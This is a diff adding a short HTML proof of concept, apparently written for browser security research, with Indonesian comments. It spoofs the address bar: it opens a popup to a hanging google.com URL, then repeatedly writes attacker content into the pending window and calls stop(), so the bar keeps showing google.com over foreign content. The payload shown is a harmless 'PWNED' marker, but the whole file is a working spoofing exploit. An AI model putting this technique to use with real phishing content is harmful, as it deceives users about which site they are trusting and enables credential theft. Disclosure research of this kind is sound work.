@@ -1,0 +1,32 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+<meta name="viewport" content="width=device-width,initial-scale=1" />
+<title>Address Bar Spoof PoC v2</title>
+</head>
+<body>
+  <!-- v2: buka window LANGSUNG ke URL brand yang menggantung, lalu tulis konten
+       penyerang + stop() (varian window.open(brand,'w')). Benign: penanda saja. -->
+  <button id="go" type="button">Open</button>
+
+  <script>
+  var BRAND = 'http://www.google.com:800';   // port menggantung -> navigasi pending
+  var MARK  = "<h1>PWNED BY PEACHNULL</h1>"
+  document.getElementById('go').onclick = function () {
+    var t = window.open(BRAND, 'w' + Date.now());
+    if (!t) { alert('popup diblokir - izinkan popup'); return; }
+
+    // pin: tulis konten + stop() berulang supaya bar tetap google.com & konten bertahan
+    var n = 0;
+    var iv = setInterval(function () {
+      try {
+        t.document.body.innerHTML = MARK;   // tulis ke window yang masih pending
+        t.stop();                            // bekukan navigasi google.com:800
+      } catch (e) { /* cross-origin / sudah commit */ }
+      if (++n >= 8) clearInterval(iv);       // ~8x selama ~4 detik
+    }, 500);
+  };
+  </script>
+</body>
+</html>
